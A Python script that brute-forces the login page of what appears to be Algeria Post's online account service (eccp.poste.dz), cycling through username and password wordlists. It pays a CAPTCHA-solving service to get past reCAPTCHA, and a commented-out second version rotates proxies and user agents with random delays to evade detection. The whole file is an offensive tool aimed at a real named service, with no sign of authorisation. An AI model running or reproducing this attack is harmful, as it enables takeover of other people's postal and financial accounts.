import requests
import time

# Target URL and wordlists
target_url = "https://eccp.poste.dz/login"
username_wordlist = "/home/kali/Desktop/web_hacking/username_list.txt"
password_wordlist = "/home/kali/Desktop/web_hacking/password_list.txt"

# 2Captcha API key and reCAPTCHA site key
api_key = "https://api.2captcha.com/createTask"  # Replace with your 2Captcha API key
captcha_site_key = "site_key_from_page_source"  # Find this in the page source of the login page

# Dictionary to hold login fields
login_info = {"username": "", "password": "", "g-recaptcha-response": "", "Login": "submit"}

# Solve reCAPTCHA using 2Captcha
def solve_recaptcha():
    print("[*] Requesting CAPTCHA solution...")
    captcha_request_url = f"http://2captcha.com/in.php?key={api_key}&method=userrecaptcha&googlekey={captcha_site_key}&pageurl={target_url}"
    response = requests.get(captcha_request_url)
    if "OK" in response.text:
        captcha_id = response.text.split('|')[1]
        print(f"[*] CAPTCHA ID: {captcha_id}")
        # Wait for CAPTCHA to be solved
        time.sleep(20)  # Initial wait time
        captcha_result_url = f"http://2captcha.com/res.php?key={api_key}&action=get&id={captcha_id}"
        while True:
            result = requests.get(captcha_result_url).text
            if "CAPCHA_NOT_READY" in result:
                print("[*] CAPTCHA not ready. Retrying...")
                time.sleep(5)  # Wait before retrying
            elif "OK" in result:
                captcha_token = result.split('|')[1]
                print(f"[+] CAPTCHA solved! Token: {captcha_token}")
                return captcha_token
            else:
                print(f"[!] CAPTCHA solving failed: {result}")
                return None
    else:
        print(f"[!] Failed to request CAPTCHA solution: {response.text}")
        return None

# Main brute force logic
def brute_force():
    with open(username_wordlist, "r") as userlist, open(password_wordlist, "r") as passlist:
        usernames = [line.strip() for line in userlist]
        passwords = [line.strip() for line in passlist]

        for username in usernames:
            for password in passwords:
                # Update login credentials
                login_info["username"] = username
                login_info["password"] = password

                # Solve CAPTCHA
                captcha_token = solve_recaptcha()
                if captcha_token:
                    login_info["g-recaptcha-response"] = captcha_token
                else:
                    print("[!] Skipping this attempt due to CAPTCHA failure.")
                    continue

                # Send POST request
                try:
                    response = requests.post(target_url, data=login_info)
                    print(f"[*] Trying: Username: {username}, Password: {password}")
                    print(f"[*] Response Code: {response.status_code}")

                    # Check for success indicators
                    if response.status_code == 302 or response.url != target_url:
                        print(f"[+] Login successful! Username: {username}, Password: {password}")
                        return
                    else:
                        print("[-] Login failed.")
                except requests.exceptions.RequestException as e:
                    print(f"[!] Error during request: {e}")

        print("[-] No valid username-password combination found!")

# Run the brute force script
if __name__ == "__main__":
    brute_force()

# import requests
# from itertools import cycle
# import time
# import random

# # Target URL
# target_url = "https://eccp.poste.dz/login"

# # Wordlists
# username_wordlist = "/home/kali/Desktop/web_hacking/username_list.txt"
# password_wordlist = "/home/kali/Desktop/web_hacking/password_list.txt"

# # Proxies
# proxy_list = [
#     "https://103.75.54.230:8080",
#     "https://36.93.140.183:8080",
# ]
# proxies = cycle(proxy_list)

# # User-Agent Pool
# user_agents = [
#     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
#     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36",
#     "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/92.0",
# ]

# # Login template
# login_info = {"username": "", "password": "", "Login": "submit"}

# # Log file
# log_file = "bruteforce_log.txt"

# # Proxy validation function
# def validate_proxy(proxy):
#     try:
#         response = requests.get("https://httpbin.org/ip", proxies={"http": proxy, "https": proxy}, timeout=5)
#         return response.status_code == 200
#     except requests.exceptions.RequestException:
#         return False

# # Validate proxies before use
# valid_proxies = [proxy for proxy in proxy_list if validate_proxy(proxy)]
# if not valid_proxies:
#     print("[!] No valid proxies found. Exiting.")
#     exit()
# proxies = cycle(valid_proxies)

# # Session
# session = requests.Session()

# # Read wordlists
# with open(username_wordlist, "r") as userlist, open(password_wordlist, "r") as passlist:
#     usernames = [line.strip() for line in userlist]
#     passwords = [line.strip() for line in passlist]

#     for username in usernames:
#         for password in passwords:
#             login_info["username"] = username
#             login_info["password"] = password

#             # Rotate proxies and user-agent
#             current_proxy = next(proxies)
#             proxy_dict = {"http": current_proxy, "https": current_proxy}
#             current_user_agent = random.choice(user_agents)
#             headers = {"User-Agent": current_user_agent}

#             try:
#                 # Send login request
#                 response = session.post(target_url, data=login_info, headers=headers, proxies=proxy_dict, timeout=10)

#                 print(f"[*] Trying: Username: {username}, Password: {password}, Proxy: {current_proxy}")
#                 print(f"[*] Response Code: {response.status_code}")

#                 # Log attempt
#                 with open(log_file, "a") as log:
#                     log.write(f"Attempt: Username: {username}, Password: {password}, Proxy: {current_proxy}, Status: {response.status_code}\n")

#                 # Check for success indicators
#                 if "Welcome" in response.text or response.url != target_url:
#                     print(f"[+] Login successful! Username: {username}, Password: {password}")
#                     with open(log_file, "a") as log:
#                         log.write(f"Success: Username: {username}, Password: {password}\n")
#                     exit()

#                 # Random delay to mimic human behavior
#                 time.sleep(random.uniform(1, 5))

#             except requests.exceptions.RequestException as e:
#                 print(f"[!] Proxy Error: {e}")

# print("[-] No valid credentials found.")
